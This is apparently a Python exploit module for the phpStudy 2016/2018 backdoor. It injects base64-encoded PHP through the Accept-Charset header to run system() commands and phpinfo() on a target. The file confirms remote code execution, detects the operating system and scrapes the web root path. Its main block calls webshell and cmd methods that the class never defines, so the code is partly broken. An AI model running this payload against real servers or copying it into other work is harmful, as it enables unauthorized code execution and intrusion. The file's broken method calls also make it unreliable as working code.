#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.encode import base64encode
from app.lib.common import get_capta, get_useragent

class Phpstudy_Backdoor_Rce_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Phpstudy Backdoor RCE',
            'description': 'Phpstudy Backdoor Remote Code Execution Vulnerability, 受影响版本: phpstudy 2016（php5.4/5.2） phpstudy 2018（php5.4/5.2）',
            'date': '2019-09-20',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }

    async def check(self):

        """
        检测是否存在漏洞

        :param:
        :return bool True or False: 是否存在漏洞
        """

        try:
            command = "system(\"" + 'echo %swin^dowslin$1ux' %(self.capta) + "\");"
            command = base64encode(command)
            self.headers['Accept-Charset'] = command
            req = await request.get(self.url, headers = self.headers)
            if self.capta in await req.text() and ('windows' in await req.text() or 'linux' in await req.text()):
                if 'windows' in await req.text():
                    self.osname = 'Windows'
                elif 'linux' in await req.text():
                    self.osname = 'Linux'
                return True
            
        except Exception as e:
            # print(e)
            pass
    
    async def webpath(self):

        """
        获取网站根路径

        :param:
        :return str root_path
        """

        command = "phpinfo();"
        command = base64encode(command)
        self.headers['Accept-Charset'] = command
        req = await request.get(self.url, headers = self.headers)
        pattern = re.compile('<tr><td class="e">_SERVER."DOCUMENT_ROOT".</td><td class="v">(.*?)</td></tr>')
        root_path = pattern.findall(await req.text())[0]
        return root_path

if __name__ == '__main__':
    Phpstudy_Backdoor_Rce = Phpstudy_Backdoor_Rce_BaseVerify('http://127.0.0.1')
    print(Phpstudy_Backdoor_Rce.webshell('test'))
    print(Phpstudy_Backdoor_Rce.cmd('whoami'))


